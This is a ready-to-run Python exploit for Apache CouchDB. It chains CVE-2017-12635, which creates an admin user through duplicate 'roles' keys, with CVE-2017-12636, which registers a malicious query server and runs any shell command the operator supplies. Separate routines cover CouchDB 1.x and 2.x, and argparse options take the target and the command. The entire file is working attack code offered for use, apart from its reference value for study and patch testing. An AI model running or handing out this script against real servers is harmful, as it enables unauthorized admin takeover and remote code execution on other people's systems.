#!/usr/bin/env python3
"""
Apache CouchDB RCE - CVE-2017-12636
Chains CVE-2017-12635 (privilege escalation) + CVE-2017-12636 (RCE)
Supports CouchDB 1.x and 2.x
"""

import requests
import argparse
import sys
import json


def create_admin_user(target, port, username, password):
    """Exploit CVE-2017-12635 to create an admin user via duplicate roles keys."""
    url = f"http://{target}:{port}/_users/org.couchdb.user:{username}"
    headers = {"Content-Type": "application/json"}
    # Duplicate 'roles' key - Erlang parser takes the first, JS takes the last
    payload = (
        '{"type": "user", "name": "' + username + '", '
        '"roles": ["_admin"], "roles": [], '
        '"password": "' + password + '"}'
    )
    r = requests.put(url, data=payload, headers=headers)
    if r.status_code in (200, 201):
        print(f"[+] Admin user '{username}' created successfully")
        return True
    elif r.status_code == 409:
        print(f"[*] User '{username}' already exists")
        return True
    else:
        print(f"[-] Failed to create admin user: {r.status_code} - {r.text}")
        return False


def exploit_v1(target, port, username, password, command):
    """Exploit CVE-2017-12636 on CouchDB 1.x using _config and _temp_view."""
    base = f"http://{username}:{password}@{target}:{port}"

    # Step 1: Register malicious query server
    print(f"[*] Setting up malicious query_server with command: {command}")
    r = requests.put(
        f"{base}/_config/query_servers/cmd",
        data=json.dumps(command)
    )
    if r.status_code not in (200, 201):
        print(f"[-] Failed to set query_server: {r.status_code} - {r.text}")
        return False
    print("[+] Malicious query_server registered")

    # Step 2: Create database
    print("[*] Creating test database 'vultest'...")
    r = requests.put(f"{base}/vultest")
    if r.status_code not in (200, 201, 412):
        print(f"[-] Failed to create database: {r.status_code} - {r.text}")
        return False

    # Step 3: Create document
    print("[*] Creating test document...")
    r = requests.put(
        f"{base}/vultest/vul",
        data='{"_id": "770895a97726d5ca6d70a22173005c7b"}'
    )
    if r.status_code not in (200, 201, 409):
        print(f"[-] Failed to create document: {r.status_code} - {r.text}")
        return False

    # Step 4: Trigger execution via temp view
    print("[*] Triggering command execution via _temp_view...")
    r = requests.post(
        f"{base}/vultest/_temp_view?limit=10",
        headers={"Content-Type": "application/json"},
        data='{"language": "cmd", "map": ""}'
    )
    print(f"[+] Command triggered! Response status: {r.status_code}")
    return True


def exploit_v2(target, port, username, password, command):
    """Exploit CVE-2017-12636 on CouchDB 2.x using _node config and design docs."""
    base = f"http://{username}:{password}@{target}:{port}"

    # Get node name
    print("[*] Fetching cluster membership...")
    r = requests.get(f"{base}/_membership")
    if r.status_code != 200:
        print(f"[-] Failed to get membership: {r.status_code}")
        return False
    node = r.json()["cluster_nodes"][0]
    print(f"[+] Found node: {node}")

    # Step 1: Register malicious query server
    print(f"[*] Setting up malicious query_server with command: {command}")
    r = requests.put(
        f"{base}/_node/{node}/_config/query_servers/cmd",
        data=json.dumps(command)
    )
    if r.status_code not in (200, 201):
        print(f"[-] Failed to set query_server: {r.status_code} - {r.text}")
        return False
    print("[+] Malicious query_server registered")

    # Step 2: Create database
    print("[*] Creating test database 'vultest'...")
    r = requests.put(f"{base}/vultest")
    if r.status_code not in (200, 201, 412):
        print(f"[-] Failed to create database: {r.status_code} - {r.text}")
        return False

    # Step 3: Create document
    print("[*] Creating test document...")
    r = requests.put(
        f"{base}/vultest/vul",
        data='{"_id": "770895a97726d5ca6d70a22173005c7b"}'
    )
    if r.status_code not in (200, 201, 409):
        print(f"[-] Failed to create document: {r.status_code} - {r.text}")
        return False

    # Step 4: Trigger via design document
    print("[*] Triggering command execution via design document...")
    r = requests.put(
        f"{base}/vultest/_design/vul",
        headers={"Content-Type": "application/json"},
        data='{"_id":"_design/test","views":{"woyun":{"map":""}}, "language":"cmd"}'
    )
    print(f"[+] Command triggered! Response status: {r.status_code}")
    return True


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2017-12636 - Apache CouchDB RCE Exploit"
    )
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=5984, help="CouchDB port (default: 5984)")
    parser.add_argument("-v", "--version", type=int, choices=[1, 2], default=1,
                        help="CouchDB major version (1 or 2, default: 1)")
    parser.add_argument("-u", "--username", default="attacker", help="Admin username (default: attacker)")
    parser.add_argument("-P", "--password", default="password", help="Admin password (default: password)")
    parser.add_argument("-c", "--command", required=True, help="Command to execute on the target")
    parser.add_argument("--skip-create-user", action="store_true",
                        help="Skip admin user creation (if credentials are already known)")

    args = parser.parse_args()

    print(f"[*] Target: {args.target}:{args.port} (CouchDB {args.version}.x)")

    if not args.skip_create_user:
        if not create_admin_user(args.target, args.port, args.username, args.password):
            print("[-] Exploit failed at user creation stage")
            sys.exit(1)

    if args.version == 1:
        success = exploit_v1(args.target, args.port, args.username, args.password, args.command)
    else:
        success = exploit_v2(args.target, args.port, args.username, args.password, args.command)

    if success:
        print("[+] Exploit completed successfully!")
    else:
        print("[-] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
